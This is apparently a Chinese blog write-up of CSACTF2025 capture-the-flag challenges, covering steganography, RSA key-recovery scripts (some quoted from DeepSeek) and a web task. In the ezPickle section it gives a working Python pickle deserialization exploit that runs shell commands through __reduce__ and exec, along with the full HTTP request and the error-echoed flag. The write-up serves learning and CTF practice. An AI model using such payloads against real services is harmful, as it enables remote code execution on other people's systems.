---
title: CSACTF2025 Writeup
date: 2025-08-30T18:30:59+08:00
tags:
  - CTF Writeup
---

鉴定为纯失

# CheckIn

[Recipe](https://lab.tonycrane.cc/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=UTFOQlExUkdlMDB4Ym1Selh6RnVkR1Z5ZEhjeGJtVmtYeVpmVTJWamRYSXhkSGxmUkROek1XZHVNMlI5DQoNCg&ieol=CRLF&oeol=CRLF)

# HidenWorld

Deformed-Image-Restorer一把梭了。

![](hw.png)
# ezPickle

根本不要出网啊这道题

看见它放hint *https://requestrepo.com* 然后变成 *无回显的rce，https://requestrepo.com* 

然后又加了*容器可以出网* 然后又加了 *可以利用app的某些方法辅助rce*

我就想笑

```python
import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        import base64
        cmd = '/readflag'
        return (exec, (
f"""
import os,base64
output = os.popen('{cmd}').read()
encoded_output = base64.b64encode(output.encode()).decode()
raise ValueError(encoded_output)
""",))
payload = pickle.dumps(Exploit())
encoded_payload = base64.b64encode(payload).decode()
print(encoded_payload)
```

cookie用引号绕过
```http
POST http://10.202.160.112:32829/admin
Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbiI6dHJ1ZSwidWlkIjoiNTIwMTMxNCJ9."IpMYuMB1-SZp-nyOvqfXMh4zvPD2PCgwrO9OyEJm644"
Content-Type: application/x-www-form-urlencoded

cmd=gASVsQAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIyVCmltcG9ydCBvcyxiYXNlNjQKb3V0cHV0ID0gb3MucG9wZW4oJy9yZWFkZmxhZycpLnJlYWQoKQplbmNvZGVkX291dHB1dCA9IGJhc2U2NC5iNjRlbmNvZGUob3V0cHV0LmVuY29kZSgpKS5kZWNvZGUoKQpyYWlzZSBWYWx1ZUVycm9yKGVuY29kZWRfb3V0cHV0KQqUhZRSlC4=
```

报错回显：

Response:

```http
HTTP/1.1 200 OK
content-length: 75
connection: close
content-type: text/plain; charset=utf-8

Error: Q1NBQ1RGe04wd191X0tuMHdfaDBXX1AxY0sxM193MHJrc184NzI2YTMwZDA1ZGZ9Cg==
```

`CSACTF{N0w_u_Kn0w_h0W_P1cK13_w0rks_8726a30d05df}`

# babySteg

搜索comments中字段`JPEG Encoder Copyright 1998, James R. Weeks and BioElectroMech.`知是[matthewgao/F5-steganography: F5 steganography](https://github.com/matthewgao/F5-steganography)

文件尾base64解码为`CSACTF{1T_SEeMs_L1kE_4_fL49}`推测为密码（灵感时刻.jpg）

是故运行

```bash
$ [Redacted]/jre-1.8/bin/java Extract ./babySteg1.jpg -p "CSACTF{1T_SEeMs_L1kE_4_fL49}"
Huffman decoding starts
Permutation starts
554496 indices shuffled
Extraction starts
Length of embedded file: 39 bytes
(1, 127, 7) code used
```

得到输出`CSACTF{N0W_u_kNoW_f5_4Nd_7He_rE41_fL49}`

# 签退

略。`CSACTF{H0p3_u_h4v3_a_go0d_7im3}`

# babyRsa

最有deepseek的一集

Part 1

> 根据提供的值（d-p、pow(m, e, N) 和 N），我们可以通过求解 RSA 参数来恢复明文 m。脚本通过循环可能的乘数 r（从 1 到 e=65537），利用二次方程求解素数 p，并最终解密得到 flag。
> 
> 以下是 Python 脚本：
> 
> ```python
> import math
> from Crypto.Util.number import long_to_bytes
> 
> e = 65537
> 
> # 从 output.txt 读取值
> with open('output.txt', 'r') as f:
>     lines = f.readlines()
>     k = int(lines[0].strip())
>     c = int(lines[1].strip())
>     N = int(lines[2].strip())
> 
> # 循环遍历可能的 r 值
> for r in range(1, e+1):
>     if r % 10000 == 0:
>         print(f"Trying r = {r}")  # 进度指示
>     A = e + r
>     B = e * k - 1 - r * N - r
>     C = r * N
> 
>     # 计算判别式
>     D = B*B - 4*A*C
>     if D < 0:
>         continue
> 
>     # 检查 D 是否为完全平方数
>     root = math.isqrt(D)
>     if root * root != D:
>         continue
> 
>     # 计算可能的 p
>     num = -B + root
>     if num % (2*A) != 0:
>         continue
>     p = num // (2*A)
> 
>     # 检查 p 是否整除 N
>     if N % p != 0:
>         continue
> 
>     print(f"Found p: {p}")
>     q = N // p
>     phi = (p-1) * (q-1)
>     d = pow(e, -1, phi)
>     m = pow(c, d, N)
>     flag = long_to_bytes(m)
>     print(flag)
>     break
> else:
>     print("Not found")
> ```
> 
> ### 使用说明：
> 1. 将提供的值（d-p、pow(m, e, N) 和 N）按顺序保存到 `output.txt` 文件中，每行一个值。
> 2. 确保已安装 `pycryptodome` 库（包含 `Crypto.Util.number`），可以使用 `pip install pycryptodome` 安装。
> 3. 运行脚本，它将输出解密后的 flag。
> 
> 此脚本通过数学关系求解 RSA 参数 p，并解密得到明文 m。循环次数最多为 65537 次，在现代计算机上可以快速完成。

`flag{117699abef7d1e`

Part 2

> 为了解出给定的RSA加密中的明文 $m$，我们需要分解模数 $n$。给定 $n$ 和 $c$ 以及密钥生成方式，其中 $q$ 是 $p$ 与 $(1<<900) - 1$ 异或后的下一个素数，我们可以利用这种关系通过求解二次方程模 $2^{900}$ 来找到 $p$ 和 $q$。以下是实现这一点的Python脚本。
> 
> ```python
> import math
> from Crypto.Util.number import long_to_bytes
> 
> def main(n, c):
>     e = 0x10001
>     base = 2**900
>     N_low = n % base
> 
>     found = False
>     p_val = None
>     q_val = None
> 
>     for k in range(1, 10000, 2):
>         solutions = [1]
>         for m in range(2, 901):
>             new_solutions = []
>             for b0 in solutions:
>                 f_val = b0*b0 + b0*(1 - k) + N_low
>                 if f_val % (2**(m-1)) != 0:
>                     continue
>                 c_val = f_val // (2**(m-1))
>                 if c_val % 2 == 0:
>                     new_solutions.append(b0)
>                     new_solutions.append(b0 + 2**(m-1))
>             solutions = new_solutions
>             if not solutions:
>                 break
> 
>         if not solutions:
>             continue
> 
>         for b in solutions:
>             d = base - 1 - b + k
>             C = b * d - n
>             D = (base - 1 + k)**2 - 4 * C
>             root = math.isqrt(D)
>             if root * root != D:
>                 continue
>             A = (- (base - 1 + k) + root) // 2
>             if A % base != 0:
>                 continue
>             p = A + b
>             if n % p == 0:
>                 p_val = p
>                 q_val = n // p
>                 found = True
>                 break
>         if found:
>             break
> 
>     if not found:
>         print("Failed to factor n")
>         return
> 
>     phi = (p_val - 1) * (q_val - 1)
>     d = pow(e, -1, phi)
>     m = pow(c, d, n)
>     flag = long_to_bytes(m)
>     print(flag.decode())
> 
> if __name__ == '__main__':
>     n = int(input("Enter n: "))
>     c = int(input("Enter c: "))
>     main(n, c)
> ```
> 
> ### 使用说明：
> 1. 将上述代码保存为脚本文件（例如 `solve.py`）。
> 2. 运行脚本并输入已知的 $n$ 和 $c$ 值。
> 3. 脚本将计算私钥并解密出明文 $m$，输出flag。
> 
> ### 注意：
> - 脚本假设 $k$（即 `next_prime` 的偏移量）是奇数且小于10000。这通常成立，因为素数的间隔在1024位数时通常较小。
> - 脚本使用 `math.isqrt` 来计算整数平方根，需要Python 3.8及以上版本。
> - 如果分解失败，可以尝试增加 $k$ 的范围上限。
> 
> 此脚本通过求解模 $2^{900}$ 的二次方程来找到 $p$ 的低900位，然后利用二次方程求出完整的 $p$，最终分解 $n$ 并解密 $c$。

`e592d8cfae5fbb6fe7}`

# ezCrypto

又到了deepseek魅力时刻

> 为了解密秘密消息 `secret`，我们需要从给定的 `c`, `c1`, `c2`, `N` 中恢复出 RSA 的私钥参数 `p` 和 `q`。通过利用 `c1` 和 `c2` 的线性关系，我们可以计算 `p` 和 `q`，然后使用 RSA 解密得到 `secret`。
> 
> 以下是完整的 Python 脚本：
> 
> ```python
> from Crypto.Util.number import long_to_bytes
> from math import gcd
> 
> # Given e1 and e2
> e1 = 9993078339649918633394551494432099987489636970426459609511857467341547586587525392554182350765642296219526020856710856746033936605501022624688690300688439
> e2 = 9862231551884468205315488646474297306588640159481717035401356860971981714476971478488573347081320483033055786493180165517487943548799848155409701594695241
> 
> # Replace these values with the actual output from encrypt()
> c =  # Insert actual value here
> c1 = # Insert actual value here
> c2 = # Insert actual value here
> N =  # Insert actual value here
> 
> # Compute the product e1 * e2
> exp = e1 * e2
> 
> # Compute T1 = c1^e2 * 3^(e1*e2) mod N
> T1 = (pow(c1, e2, N) * pow(3, exp, N)) % N
> 
> # Compute T2 = c2^e1 * 2^(e1*e2) mod N
> T2 = (pow(c2, e1, N) * pow(2, exp, N)) % N
> 
> # Compute K = (T1 - T2) mod N
> K = (T1 - T2) % N
> 
> # Find p by computing gcd(K, N)
> p = gcd(K, N)
> if p == 1 or p == N:
>     raise ValueError("Failed to find prime factor p")
> q = N // p
> 
> # Compute phi(N)
> phi = (p - 1) * (q - 1)
> 
> # Decrypt the message using RSA
> e = 65537
> d = pow(e, -1, phi)
> m = pow(c, d, N)
> secret = long_to_bytes(m)
> 
> print(secret)
> ```
> 
> ### 使用说明：
> 1. 将脚本中的 `c`, `c1`, `c2`, `N` 替换为 `encrypt` 函数的实际输出值。
> 2. 运行脚本，即可得到解密后的 `secret`。
> 
> 该方法通过计算 `c1` 和 `c2` 的线性组合来找到 `p`，然后推导出 `q`，最终解密出消息。注意，脚本假设 `e1` 和 `e2` 是给定的，并且加密使用的指数 `e` 是 65537。

`b'R28wZF9Kb0IhX1dlMUMwbUVfdDBfb1VSX2NzQUN0Rl8ybzI1IQ=='`

`Go0d_JoB!_We1C0mE_t0_oUR_csACtF_2o25!`